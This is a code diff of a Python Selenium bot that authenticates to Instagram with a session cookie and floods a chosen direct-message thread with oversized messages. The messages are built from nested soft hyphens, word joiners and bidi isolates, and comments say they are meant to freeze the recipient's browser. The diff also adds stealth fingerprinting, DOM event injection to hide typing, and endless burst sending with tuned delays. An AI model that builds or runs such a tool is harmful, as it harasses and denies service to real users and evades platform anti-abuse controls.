@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (THREAD-HIJACK V61)
-# 📅 STATUS: MAIN-THREAD-LOCK | 4-AGENT TOTAL | AWS-CPU-TARGET
+# 🚀 PROJECT: PRAVEER.OWNS (ATOMIC-BYPASS V62)
+# 📅 STATUS: ZERO-TYPING-LAG | 4-AGENT TOTAL | AWS-CPU-TARGET
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,35 +12,31 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.05, 0.15)  # 🔥 High frequency to prevent CPU cooldown
-REST_AFTER_STRIKES = 200   
-REST_DURATION = 2          
+BURST_SPEED = (0.3, 0.7)    # 🛡️ Optimized for delivery success
+REST_AFTER_STRIKES = 120   
+REST_DURATION = 4          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_hijack_payload():
-    """Generates a payload that forces constant 'Sub-pixel Reflow'."""
+def get_atomic_payload():
+    """Generates a high-entropy block designed to lock the opponent's Main Thread."""
     u_id = random.randint(100, 999)
-    # \u00AD = Soft Hyphen (Forces speculate wrap math)
-    # \u2060 = Word Joiner (Prevents actual wrapping)
-    # \u2068 = Isolate (Forces new render layer)
-    shy, glue, iso, pop = "\u00AD", "\u2060", "\u2068", "\u2069"
+    # \u2060 = Word Joiner | \u2068 = Isolate | \u00AD = Soft Hyphen
+    glue, iso, shy, pop = "\u2060", "\u2068", "\u00AD", "\u2069"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HIJACK_ID:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [ATOMIC_NODE:{u_id}]"
     
     body = []
-    # 420 lines of 'Unstable' layout math
-    for i in range(420):
-        # We sandwich every letter with a 'Soft Hyphen'. 
-        # The browser thinks: 'I might need to wrap here.'
-        # Then the 'Word Joiner' says: 'No, you can't.'
-        # This contradiction forces the CPU to re-calculate 50+ times per line.
-        line = f"{iso}P{shy}R{shy}A{shy}V{shy}E{shy}E{shy}R{glue}P{shy}A{shy}P{shy}A{glue}🌙{i}{pop}{glue*5}"
+    # 380 lines of mathematically 'Unstable' layout logic
+    for i in range(380):
+        # We nest isolates and hyphens. This forces the opponent's browser 
+        # to re-calculate the entire chat window for every new message.
+        line = f"{iso}P{shy}R{shy}A{shy}V{shy}E{shy}E{shy}R{glue}P{shy}A{shy}P{shy}A{glue}🌙{i}{pop}{glue*10}"
         body.append(line)
         
-    return f"{header}\n{glue.join(body)}".strip()[:9998]
+    return f"{header}\n{glue.join(body)}".strip()[:9995]
 
 def get_driver(agent_id):
     with BROWSER_LAUNCH_LOCK:
@@ -48,7 +44,9 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--disable-gpu") # Keep YOUR bot light
+        # 🛡️ CRITICAL: We disable our own rendering to prevent 'Typing' lag
+        chrome_options.add_argument("--disable-gpu")
+        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
         chrome_options.binary_location = "/usr/bin/google-chrome"
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
@@ -58,19 +56,21 @@ def get_driver(agent_id):
         stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
         return driver
 
-def atomic_send(driver, text):
-    """Bypasses local UI lag with direct DOM event injection."""
+def atomic_dispatch_send(driver, text):
+    """Bypasses the 'Typing' status by firing hardware-level dispatch events."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
             if (box) {
                 box.focus();
+                // 1. Force a clean state
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
+                // 2. Inject heavy payload
                 document.execCommand('insertText', false, arguments[0]);
-                
+                // 3. Trigger framework state update (React/Internal)
                 box.dispatchEvent(new Event('input', { bubbles: true }));
-                
+                // 4. Force Enter dispatch using a Trusted Event
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -88,27 +88,29 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(12) 
+            time.sleep(15) 
             
             strike_count = 0
             while True:
-                payload = get_hijack_payload()
-                if atomic_send(driver, payload):
+                payload = get_atomic_payload()
+                if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Hijack-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Atomic-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 80 == 0:
+                    if strike_count % 50 == 0:
+                        # Clear YOUR memory to keep the bot fast
                         driver.refresh()
-                        time.sleep(5)
+                        time.sleep(10)
+                
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             try: driver.quit()
             except: pass
-            time.sleep(3)
+            time.sleep(5)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
